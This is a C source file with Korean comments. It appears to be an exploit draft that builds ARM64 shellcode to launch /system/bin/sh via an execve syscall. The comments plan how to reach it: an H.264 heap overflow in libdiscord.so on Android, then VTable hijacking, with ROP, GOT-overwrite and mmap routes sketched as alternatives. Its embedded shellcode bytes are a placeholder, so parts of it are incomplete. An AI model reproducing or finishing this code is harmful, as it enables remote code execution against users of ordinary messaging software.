/*
 * ARM64 Minimal Shellcode - /system/bin/sh 실행
 *
 * 컴파일:
 * gcc -o arm64_shellcode_test -nostdlib -Wl,-Ttext=0x400000 \
 *     -Wl,-N arm64_shellcode_minimal.c
 * objcopy -O binary arm64_shellcode_test arm64_shellcode.bin
 *
 * 또는 직접 바이너리 배열로 정의
 */

/* 방법 1: 인라인 ARM64 바이너리 */

// /system/bin/sh 문자열 (null-terminated)
static const char shell_path[] = "/system/bin/sh";

// ARM64 어셈블리 코드 (바이너리)
// mov x0, #0x10 (첫 호출 사이클에서 x0 = 주소로 설정)
// svc #221 (execve syscall)
// 하지만 이것은 복잡함

/* 방법 2: libc system() 호출 - ROP 방식 */

// system()은 libc에 있으므로, 그 주소를 알아야 함
// Android libc.so는 일반적으로 다음 offset에 로드됨:
// system: 0x00040000 (상대 주소, ASLR로 변함)

/* 방법 3: mmap + shellcode 실행 */

// 현재 overflow로 메모리를 쓸 수 있으므로,
// 1. mmap() 호출 (ROP)
// 2. shellcode를 mmap된 영역에 쓰기
// 3. shellcode 실행

/* 방법 4: exec() 호출 직접 실행 */

// 가장 간단: 이미 실행 중인 메모리에서 system()이나 exec() 함수 호출

// 여기서는 방법 4를 사용:
// H.264 overflow로 함수 포인터를 /system/bin/sh 주소로 설정
// 또는 기존 함수를 system()으로 리디렉트

typedef int (*shell_func_t)(const char *cmd);

// H.264 페이로드에 직접 포함될 shellcode (최소)
// 목표: 힙 오버플로우 후 함수 포인터가 이 주소를 가리키도록 함

static void trigger_shell(void) {
    // 이 함수는 overflow로 호출됨
    // 복잡한 syscall 대신, 기존 libc 함수 사용

    // 방법: LD_PRELOAD 또는 GOT overwrite를 통해
    // system() 함수가 자동으로 호출되도록

    // 또는 직접 execve() syscall
    asm volatile(
        // ARM64 execve syscall
        // x0 = &"/system/bin/sh"
        // x1 = NULL  (argv)
        // x2 = NULL  (envp)
        // x8 = 221   (execve syscall)
        // svc 0

        "mov x0, %0\n\t"           // x0 = &shell_path
        "mov x1, #0\n\t"            // x1 = NULL
        "mov x2, #0\n\t"            // x2 = NULL
        "mov x8, #221\n\t"         // x8 = execve syscall (ARM64)
        "svc #0\n\t"               // call syscall
        :: "r" (&shell_path)
    );
}

/* 실제 페이로드: H.264에 포함될 바이너리 */

// ARM64 바이너리 코드 (hex)
// mov x0, #0x... (주소 설정 - PIC 필요)
// svc #221 (execve)
// ret

static const uint8_t arm64_exec_shellcode[] = {
    // 이것은 실제 테스트용
    // 실제로는 ASLR 때문에 주소 계산이 필요

    0x00, 0x00, 0x80, 0xd2,  // mov x0, #0
    0xc0, 0x03, 0x5f, 0xd6,  // ret
};

/* 방법 5: 가장 실용적 - VTable 하이재킹 */

// libdiscord.so의 C++ 객체 VTable 포인터를 덮어쓰기
// overflow 후, 다음 malloc이 해당 포인터 위치를 할당받음
// 그리고 우리는 그곳에 trigger_shell() 주소를 씀
// 가상 함수 호출 시 trigger_shell() 실행

// 구조:
// 1. H.264 overflow: malloc(0) + 4GB 쓰기
// 2. 다음 malloc()이 VTable 영역을 할당받음
// 3. VTable 첫 번째 함수 포인터가 trigger_shell() 주소로 설정됨
// 4. 가상 함수 호출 시 trigger_shell() 실행
// 5. execve("/system/bin/sh") 실행 완료

int main(void) {
    // 이것은 일반적인 C 프로그램이지만,
    // 실제 페이로드에서는 trigger_shell()이 overflow로 호출됨

    trigger_shell();

    return 0;
}
